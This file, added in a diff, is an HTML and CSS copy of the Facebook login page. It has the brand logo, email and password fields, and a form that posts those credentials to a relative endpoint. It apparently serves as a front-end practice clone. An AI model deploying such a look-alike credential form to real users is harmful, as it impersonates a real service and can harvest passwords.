@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+       <style>
+              body{
+                     background-color:#f0f2f5;
+              }
+               *{
+                  margin:0%;
+                  padding: 0%;
+                  box-sizing: border-box;
+                }
+               section{
+                        width:100%;
+                        height: 100vh;
+                        display:flex;
+                        justify-content:center;
+                        align-items:center;
+                        gap: 320px;
+                        background-color:#f0f2f5;
+
+               }
+               div{
+                      /* border: 5px solid black; */
+                      width: 400px;
+                      height: 340px;
+                      margin: 5px;
+                      
+                      
+
+               }
+               .divison1{ 
+                      background-color: white;
+                      border-radius: 10px;
+                      position: relative;
+                      display: flex;
+                      justify-content: center;
+                      box-shadow: 0px 0.5px 0.4px rgb(42, 41, 41);
+
+                     
+               }
+               #email{
+                width: 370px;
+                height: 50px;
+                position: absolute;
+                border:1px solid grey;
+                border-radius: 7px;
+                left: 12px ;
+                top: 12px;
+}
+               #password{
+                width: 370px;
+                height: 50px;
+                position: absolute;
+                border:1px solid grey;
+                border-radius: 7px;
+                left: 12px ;
+                top: 80px;
+                      
+               }
+               #password:hover{
+                border:2px solid #1589FF;
+               }
+               #email:hover{
+                border:2px solid  #1589FF;
+
+               }
+
+               #button{
+                        background-color: #1589FF;
+                        width: 370px;
+                        height: 50px;
+                        position: absolute;
+                        left: 12px ;
+                        top: 150px;
+                        border:2px solid  #1589FF;
+                        border-radius: 7px;
+                        font-weight: bold;
+                        color: white;
+                        font-size: 20px;
+               }
+
+               h4{
+                             position: absolute;
+                              left:125px; 
+                              
+                              top:225px;
+                              color: #1589FF;
+                              
+                              
+               }
+               h4:hover{ text-decoration: underline;
+                         color: #1589FF;
+
+               }
+               #create{ 
+                
+                left:105px;
+                top: 280px;
+                background-color:#02af24;
+                        width: 188px;
+                        height: 40px;
+                        position: absolute;
+                       border:2px solid  #02af24;
+                        border-radius: 7px;
+                        font-weight: bold;
+                        color: white;
+                        font-size: 16px;
+
+               }
+               #create:hover{
+                              background-color:  #019a20;
+               }
+             
+               #under{ 
+                     position: absolute;
+                     left:15px;
+                     top:262px;
+                     width: 373px;
+                     height: 0.1px;
+                     color: grey;
+
+
+               }
+                #page{
+                     position: absolute;
+                     top: 370px;
+                     font-size:medium;
+                     left: 35px;
+                     
+                }
+                strong:hover{
+                              text-decoration: underline black;
+                }
+               /* @media(max-width:450px){
+
+                     div{
+                            justify-content: center;
+                            width: 200px;
+                            height: 200px;
+                     }
+                     .div1{
+                            justify-content: center;
+                            width: 200px;
+                            height: 200px;
+                     } */
+                     /* @media screen and (max-device-width: 450px) {
+                      .gfg-div {
+                      width: 400px;
+                      height: 200px;
+    
+                                  }
+                        } */
+
+                        @media(max-width: 478px) {
+                        
+                         section{
+                            display: flex;
+                            align-items:flex-start;
+                            justify-items:flex-start;
+                            flex-direction:column;
+                            height:10%;
+                                   width:20%;
+                                  
+                         }
+                      
+
+                            .divison1{
+                                   
+                           
+                           display: flex;
+                           flex-direction: column;
+                           justify-content:center;
+                                   align-items:center;
+                            }
+}
+                             
+            
+       </style>
+</body>
+        <section>
+                 <div>
+                     <img src="https://i.ibb.co/7tfpDKX/fb.png" alt="fb" border="0">
+                 </div>
+
+                 <div class="divison1">
+                       <form method="post" action="unvalidate">
+                        <label>
+                            <input id="email" type="Email" name="email" required autocomplete="email"  placeholder="   Email address or phone number " />
+
+                            <input id="password" type="password" name="PASS" required maxlength="18" placeholder="    Password"/>
+                            <button id="button" type="submit">log in</button>
+                            <h4>Forgotten password?</h4>
+                            <hr id="under">
+                            <button id="create" type="button">Create new account</button>
+                            <h3 id="page"><strong>Create a Page</strong> for a celebrity, brand or business.</h3>
+                            
+                            
+                       </form>
+                 </div>
+        </section>
+</html>
